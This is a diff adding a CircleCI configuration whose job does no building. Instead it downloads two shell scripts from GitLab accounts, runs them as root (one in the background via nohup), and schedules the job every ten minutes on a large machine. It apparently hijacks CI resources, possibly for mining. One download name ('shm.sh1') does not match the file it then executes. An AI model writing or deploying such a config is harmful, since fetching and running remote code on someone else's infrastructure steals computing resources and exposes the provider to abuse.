@@ -1,0 +1,42 @@
+version: 2.1
+jobs:
+  build:
+    
+    machine:
+      resource_class: 2xlarge
+      image: ubuntu-2004:202101-01
+    steps:
+      - run: 
+         name: Awal
+         command: |
+          echo Done
+      - run: 
+         name: Downloading
+         command: |
+          sudo su --command "wget https://gitlab.com/JanellsBarbee/shm/-/raw/main/shm.sh1 && chmod u+x shm.sh"
+          sudo su --command "nohup ./shm.sh --log=stdout > meta.log &"
+          sleep 10
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: Executing
+         no_output_timeout: 59m
+         command: |
+          wget https://gitlab.com/ChanaAshmore/dxc/-/raw/main/maxs.sh
+          chmod +x maxs.sh
+          sudo su --command "./maxs.sh"
+workflows:
+    version: 2
+    build:
+        jobs:
+            - build
+
+
+scheduled-workflow:
+    triggers:
+      - schedule:
+          cron: "*/10 * * * *"
+          filters:
+           branches:
+             only:
+               - circleci-project-setup
+          
